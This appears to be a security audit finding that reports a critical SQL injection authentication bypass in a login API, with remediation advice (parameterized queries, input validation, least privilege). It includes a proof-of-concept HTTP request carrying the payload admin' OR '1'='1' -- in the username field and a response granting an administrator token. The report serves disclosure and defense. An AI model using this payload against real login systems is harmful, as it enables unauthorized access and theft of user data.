CRITICAL CWE-89 | CVSS 9.8

SQL Injection Authentication Bypass

The login form at /api/v1/auth/login is vulnerable to SQL injection, allowing an attacker to bypass authentication and gain administrative access to the application.

Vulnerability Details

POST /api/v1/auth/login HTTP/1.1 
Host: target-application.com
Content-Type: application/json

{
  "username": "admin' OR '1'='1' --",
  "password": "irrelevant"
}
[RESPONSE] HTTP/1.1 200 OK 
"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
"role": "administrator"

Impact Analysis

  • Full database compromise including user credentials and PII
  • Administrative access to application backend
  • Potential server compromise via database functions

Remediation Steps

1. Implement Parameterized Queries

Use prepared statements with parameterized queries to prevent SQL injection attacks.

// Secure Implementation
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
await db.query(query, [username, password]);

2. Input Validation

Implement strict input validation and sanitization for all user inputs.

3. Least Privilege

Ensure database connections use least privilege principles.
